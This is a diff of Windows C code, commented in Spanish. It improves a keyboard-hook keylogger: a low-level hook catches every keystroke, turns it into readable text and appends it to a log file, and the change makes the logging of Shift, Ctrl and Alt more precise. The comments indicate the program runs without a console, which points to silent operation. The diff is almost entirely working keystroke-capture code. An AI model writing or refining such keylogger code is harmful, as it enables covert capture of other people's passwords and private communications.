@@ -44,7 +44,6 @@ BOOL CreateLogFile(void)
 
         errno_t err = fopen_s(&logFile, finalPath_mb, "a"); // Usar "a" (append) para no borrar en cada reinicio
         if (err != 0 || !logFile) {
-            // No usar printf aquí porque no hay consola
             return FALSE;
         }
         return TRUE;
@@ -58,15 +57,35 @@ BOOL CreateLogFile(void)
     return TRUE;
 }
 
-void AppendModifiers(char* buffer, size_t bufferSize)
+void AppendModifiers(char* buffer, size_t bufferSize, DWORD vkCode)
 {
-    int shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
-    int ctrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
-    int alt = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
+    static int lastShift = 0;
+    static int lastCtrl = 0;
+    static int lastAlt = 0;
 
-    if (shift) strcat_s(buffer, bufferSize, "[shift+]");
-    if (ctrl) strcat_s(buffer, bufferSize, "[ctrl+]");
-    if (alt) strcat_s(buffer, bufferSize, "[alt+]");
+    int shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+    int ctrl  = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
+    int alt   = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
+
+    // Si la tecla pulsada es un modificador, solo registrar la transición
+    if ((vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) && shift && !lastShift)
+        strcat_s(buffer, bufferSize, "[SHIFT+]");
+    else if ((vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) && ctrl && !lastCtrl)
+        strcat_s(buffer, bufferSize, "[CTRL+]");
+    else if ((vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU) && alt && !lastAlt)
+        strcat_s(buffer, bufferSize, "[ALT+]");
+    // Si la tecla pulsada NO es un modificador, añade todos los modificadores activos
+    else if (!(vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT ||
+               vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL ||
+               vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU)) {
+        if (ctrl)  strcat_s(buffer, bufferSize, "[CTRL+]");
+        if (alt)   strcat_s(buffer, bufferSize, "[ALT+]");
+        if (shift) strcat_s(buffer, bufferSize, "[SHIFT+]");
+    }
+
+    lastShift = shift;
+    lastCtrl = ctrl;
+    lastAlt = alt;
 }
 
 // Funcion que se ejecuta cada vez que se pulsa una tecla
@@ -89,7 +108,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
             // Construir string legible
             char logStr[64] = {0};
-            AppendModifiers(logStr, sizeof(logStr));
+            AppendModifiers(logStr, sizeof(logStr), vkCode);
             strcat_s(logStr, sizeof(logStr), VkCodeToString(vkCode));
             
 
